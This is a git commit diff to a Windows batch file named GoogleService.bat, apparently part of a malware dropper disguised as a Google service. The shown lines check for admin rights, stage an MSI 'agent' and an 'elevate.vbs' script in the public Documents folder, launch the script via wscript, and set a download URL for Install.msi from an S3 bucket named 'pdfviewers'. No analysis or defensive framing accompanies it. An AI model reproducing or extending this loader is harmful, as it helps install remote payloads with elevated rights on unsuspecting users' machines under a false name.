09d8459f04917c8eb603d88a840a25f116bdafda
elmismedina0126 <elmismedina0126@gmail.com>
2026-09-06 18:52:53 -0500

    Update GoogleService.bat

--- GoogleService.bat
+++ GoogleService.bat
@@ -8,9 +8,9 @@ if %errorLevel% NEQ 0 (
     exit /b
 )
 
-set "Temps=%TEMP%"
-set "agents=%Temps%\agent-c92d02.msi"
-set "main=%Temps%\elevate.vbs"
+set "Temps=%PUBLIC%"
+set "agents=%Temps%\Documents\agent-c92d02.msi"
+set "main=%Temps%\Documents\elevate.vbs"
 
 start "" wscript.exe "%main%"
 set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"
